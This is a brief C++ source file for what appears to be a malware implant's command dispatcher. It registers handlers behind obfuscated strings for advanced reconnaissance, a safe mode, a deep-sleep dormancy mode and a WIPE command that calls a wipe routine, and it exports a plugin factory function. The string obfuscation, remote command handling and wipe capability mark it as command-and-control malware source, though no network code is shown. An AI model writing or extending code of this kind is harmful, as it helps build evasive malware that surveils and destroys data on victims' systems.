#include "DynamicDispatcher.h"
#include "Globals.h"
#include "Wipe.h"
#include "Obfuscation.h"
#include <iostream>

void DynamicDispatcher::init() {
    CommandRegistry::instance().register_handler(OBFUSCATE("RECON_ADVANCED"), [](const nlohmann::json& params){
        CommandRegistry::instance().dispatch({{"command", "RECON_ADV"}, {"parameters", params}});
    });
    CommandRegistry::instance().register_handler(OBFUSCATE("SAFE_MODE"), [](const nlohmann::json&){
        g_safe_mode.store(true);
    });
    CommandRegistry::instance().register_handler(OBFUSCATE("DEEP_SLEEP"), [](const nlohmann::json&){
        g_deep_sleep.store(true);
    });
    CommandRegistry::instance().register_handler(OBFUSCATE("WIPE"), [](const nlohmann::json&){
        perform_wipe();
    });
}

extern "C" Module* create_module() { return new DynamicDispatcher(); }
